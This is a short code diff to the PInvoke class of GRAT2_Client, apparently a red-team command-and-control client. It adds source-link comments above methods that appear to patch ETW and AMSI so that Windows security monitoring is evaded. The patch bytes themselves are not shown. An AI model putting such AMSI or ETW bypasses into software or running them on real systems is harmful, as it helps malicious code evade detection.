@@ -14,6 +14,7 @@ namespace GRAT2_Client.PInvoke
 
         public static void PatchingEtw()
         {
+            // https://blog.xpnsec.com/hiding-your-dotnet-etw/
             byte[] patch;
 
             if (IntPtr.Size == 4)
@@ -49,6 +50,8 @@ namespace GRAT2_Client.PInvoke
         public static void PatchingAmsi()
         {
             // https://twitter.com/_xpn_/status/1170852932650262530
+            // https://github.com/rasta-mouse/AmsiScanBufferBypass
+
             byte[] patch;
 
             if (IntPtr.Size == 4)
